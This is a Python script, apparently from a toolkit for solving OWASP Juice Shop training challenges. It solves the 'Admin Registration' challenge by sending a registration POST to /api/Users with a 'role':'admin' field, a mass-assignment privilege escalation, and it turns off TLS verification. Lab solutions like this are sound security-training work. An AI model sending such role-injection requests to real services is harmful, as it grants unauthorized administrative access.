"""
This file is used to solve OWASP JUICESHOP challange ADMIN REGISTRATION
GOAL: Register a new user and set to be admin
Principle: Use POST request and set the role from customer to admin
"""

from plugins import attack as a
from plugins import test_user_generate as usrGen
import urllib3
from plugins import header_config
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class admin_registration(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/api/Users'
        self.password = '123456'
        usr = usrGen.new_user_generate()
        self.email = usr.generate_email()

    def generator(self):
        json_data = {
            'email': self.email,
            'password': self.password,
            'passwordRepeat': '123456',
            'role':'admin',
            'securityQuestion': {
                'id': 2,
                'question': 'Mother\'s maiden name?',
            },
            'securityAnswer': 'test',
        }
        return json_data

    def run(self):
        json_data = self.generator()
        response = a.requests.post(self.url, json=json_data, verify=False)
        print(response.status_code)
        ## load cookie
        if response.status_code == 201:
            res_payload_dict = response.json()
            print("response begin")
            print(response.text)
            print("response end")
            print("Congratulations! You have successfully solve a challenge Admin Registration")
            print("Now you can login with admin email " + self.email +" and password " + self.password)
            userid = response.json()["data"]["id"]
            return self.email, self.password, userid


